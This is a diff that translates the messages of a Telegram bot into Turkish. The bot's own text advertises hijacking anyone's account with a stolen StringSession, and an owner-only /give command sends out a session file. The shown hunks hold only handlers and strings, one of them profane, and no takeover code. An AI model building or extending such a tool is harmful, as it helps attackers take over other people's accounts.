@@ -182,22 +182,22 @@ M: [Telefon numarasını StringSession kullanarak değiştirin]
 Başka zaman yeni özellikler eklerim 😆
 '''
 mm = '''
-You can hack anybody
-Take his StringSession and use me
-I will give you full power of mine
-Type /hack
+herkesi hackleyebilirsin
+Onun StringSession'ını al ve beni kullan
+sana tüm gücümü vereceğim
+/hack yazın
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
   global mm
   if not event.is_private:
-    await event.reply("please use me in pm🥺")
+    await event.reply("Lütfen beni özelden kullan🥺")
   else:
     await event.reply(mm)
 @client.on(events.NewMessage(pattern="/give"))
 async def op(event):
   if not event.sender_id == legendx:
-    return await event.reply("please don't use me fuck off 🥺")
+    return await event.reply("Lütfen beni kullanma siktir git🥺")
   try:
     await event.reply("session bot file", file="Xarmy.session")
   except Exception as e:
@@ -206,7 +206,7 @@ async def op(event):
 
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
-  await event.reply("please use me in pm🥺")
+  await event.reply("Lütfen beni özelden kullan🥺")
 @client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
   global menu
